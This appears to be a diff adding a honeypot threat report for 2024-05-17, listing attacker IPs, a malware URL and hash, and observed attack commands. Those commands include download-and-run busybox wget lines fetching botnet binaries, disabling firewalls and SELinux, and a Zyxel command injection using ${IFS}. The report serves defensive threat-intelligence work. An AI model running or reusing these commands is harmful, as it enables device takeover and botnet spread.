@@ -1,0 +1,67 @@
+Top 5 IPs for 2024-05-17 :
+
+170.64.194.48
+176.10.174.123
+117.204.204.233
+117.254.103.165
+115.54.92.218
+
+Malware Observed:
+
+Downloaded from : http://36.97.163.215:29257/.i
+a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+https://www.virustotal.com/gui/file/a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+
+Commands/exploits observed:
+
+GET /and HTTP/1.1
+Host: 103.228.37.56
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
+pkill -f M
+pkill -f arm7
+pkill -f arm
+pkill -f x86
+pkill -f x86_64
+su 0 pkill -f M
+su 0 pkill -f arm7
+su 0 pkill -f arm
+su 0 pkill -f x86
+su 0 pkill -f x86_64
+su 0 iptables -F
+su 0 setenforce 0
+su 0 busybox wget http://103.228.37.56/a -O /data/local/tmp/a; su 0 chmod +x /data/local/tmp/a && su 0 sh /data/local/tmp/a
+busybox wget http://103.228.37.56/a; chmod 777 a;sh a
+busybox wget http://103.228.37.56/most-arm; chmod 777 most-arm; ./most-arm android.exploit
+busybox wget http://103.228.37.56/most-arm5; chmod 777 most-arm5; ./most-arm5 android.exploit
+busybox wget http://103.228.37.56/most-arm6; chmod 777 most-arm6; ./most-arm6 android.exploit
+busybox wget http://103.228.37.56/most-arm7; chmod 777 most-arm7; ./most-arm7 android.exploit
+busybox wget http://103.228.37.56/most-m68k; chmod 777 most-m68k; ./most-m68k android.exploit
+busybox wget http://103.228.37.56/most-mips; chmod 777 most-mips; ./most-mips android.exploit
+busybox wget http://103.228.37.56/most-mpsl; chmod 777 most-mpsl; ./most-mpsl android.exploit
+busybox wget http://103.228.37.56/most-ppc; chmod 777 most-ppc; ./most-ppc android.exploit
+busybox wget http://103.228.37.56/most-sh4; chmod 777 most-sh4; ./most-sh4 android.exploit
+busybox wget http://103.228.37.56/most-spc; chmod 777 most-spc; ./most-spc android.exploit
+busybox wget http://103.228.37.56/most-x86; chmod 777 most-x86; ./most-x86 android.exploit
+busybox wget http://103.228.37.56/most-x86_64; chmod 777 most-x86_64; ./most-x86_64 android.exploit
+su 0 busybox wget http://103.228.37.56/most-arm -O /data/local/tmp/most-arm;su 0 chmod 777 /data/local/tmp/most-*; su 0 /data/local/tmp/most-arm android.exploit
+su 0 busybox wget http://103.228.37.56/most-arm5 -O /data/local/tmp/most-arm5; su 0 chmod 777 /data/local/tmp/most-*; su 0 /data/local/tmp/most-arm5 android.exploit
+su 0 busybox wget http://103.228.37.56/most-arm6 -O /data/local/tmp/most-arm6; su 0 chmod 777 /data/local/tmp/most-*; su 0 /data/local/tmp/most-arm6 android.exploit
+su 0 busybox wget http://103.228.37.56/most-arm7 -O /data/local/tmp/most-arm7; su 0 chmod 777 /data/local/tmp/most-*; su 0 /data/local/tmp/most-arm7 android.exploit
+su 0 busybox wget http://103.228.37.56/most-m68k -O /data/local/tmp/most-m68k; su 0 chmod 777 /data/local/tmp/most-*; su 0 /data/local/tmp/most-m68k android.exploit
+su 0 busybox wget http://103.228.37.56/most-mips -O /data/local/tmp/most-mips; su 0 chmod 777 /data/local/tmp/most-*; su 0 /data/local/tmp/most-mips android.exploit
+su 0 busybox wget http://103.228.37.56/most-mpsl -O /data/local/tmp/most-mpsl; su 0 chmod 777 /data/local/tmp/most-*; su 0 /data/local/tmp/most-mpsl android.exploit
+su 0 busybox wget http://103.228.37.56/most-ppc -O /data/local/tmp/most-ppc; su 0 chmod 777 /data/local/tmp/most-*; su 0 /data/local/tmp/most-ppc android.exploit
+su 0 busybox wget http://103.228.37.56/most-sh4 -O /data/local/tmp/most-sh4; su 0 chmod 777 /data/local/tmp/most-*; su 0 /data/local/tmp/most-sh4 android.exploit
+su 0 busybox wget http://103.228.37.56/most-spc -O /data/local/tmp/most-spc; su 0 chmod 777 /data/local/tmp/most-*; su 0 /data/local/tmp/most-spc android.exploit
+su 0 busybox wget http://103.228.37.56/most-x86 -O /data/local/tmp/most-x86; su 0 chmod 777 /data/local/tmp/most-*; su 0 /data/local/tmp/most-x86 android.exploit
+su 0 busybox wget http://103.228.37.56/most-x86_64 -O /data/local/tmp/most-x86_64; su 0 chmod 777 /data/local/tmp/most-* su 0 /data/local/tmp/most-x86_64 android.exploit
+rm -rf most*
+a*
+
+Source IP : 119.200.13.201
+/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://103.245.236.146/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;
